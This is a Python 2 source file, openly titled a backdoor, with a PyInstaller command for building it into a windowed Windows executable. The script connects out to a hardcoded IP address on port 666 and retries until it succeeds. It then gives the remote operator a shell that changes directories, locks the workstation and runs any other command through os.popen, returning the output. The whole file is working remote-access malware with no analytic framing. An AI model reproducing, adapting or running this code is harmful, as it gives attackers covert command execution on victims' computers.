# ============================================================
# Backdoor developed by: Matheus Fontanetti Martins
# Compilling to exe: pyinstaller.exe backdoor.py --onefile --windowed --icon=icon.ico
# ============================================================

import socket
import os
import time
import ctypes

class backdoor:
	try:
		TMP = os.environ["TEMP"]
		USER_PROFILE = os.environ["USERPROFILE"]
	except Exception:
		pass

	# start initial connection
	def __init__ (self, ip, port):
		while True:
			try:
				self.con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				self.con.connect((ip,port))
			except socket.error:
				wait_time = 5
				print "[-] Error while trying to connect, trying again in", wait_time, "seconds"
				
				time.sleep(wait_time)
			else:
				break

	# intial message
	def initial_message(self):
		message = "\n"
		message += "=============================\n"
		message += "[+] Connection recieved from: " + socket.gethostname() + "\n"
		message += "[+] Type 'h' to see all options\n"
		message += "============================="
		self.con.send(message + "\r\n")

		self.con.send("=> ")

	# display commands
	def display_comands(self):
		commands = "========== Help Menu =========\n"
		commands += "- h			=> get all commands                     \n"
		commands += "- exit			=> exit from the system                 \n"
		commands += "- cd <path>		=> change to a determined path          \n"
		commands += "- message <message>	=> write a mesage to the user           \n"
		commands += "============================="

		return commands
	
	# change working directory
	def change_working_directory(self, path):
		try:
			os.chdir(path)
			return "[+] Directory changed to: " + str(path)
		except Exception as err:
			return "[-] Error changing directory: " + str(err)

	# lock computer
	def lock_computer(self):
		try:
			ctypes.windll.user32.LockWorkStation()
			return "[+] Successfully locked the computer"
		except Exception as err:
			return "[-] Falied to lock the computer: " + str(err)


	# loop shell function
	def run (self):

		self.initial_message()		

		while True:
			cmd = self.con.recv(1024)

			cmd_0 = str(cmd).strip().split(" ")[0]
			cmd_rest = " ".join(str(cmd).strip().split(" ")[1:])

			# help menu
			if cmd_0 == "h":
				ret = self.display_comands()
				self.con.send(ret + "\r\n")
			
			# exit backdoor
			elif cmd_0 == "exit":
				self.con.close()
				exit()

			# change directory
			elif cmd_0 == "cd":
				ret = self.change_working_directory(cmd_rest)
				self.con.send(ret + "\r\n")

			# lock computer
			elif cmd_0 == "lock":
				ret = self.lock_computer()
				self.con.send(ret + "\r\n")

			# execute system command
			else:
				for comando in os.popen(cmd):
					self.con.send(comando)
				
			self.con.send("=> ")
		

my_backdoor = backdoor("137.184.197.191", 666)
my_backdoor.run()
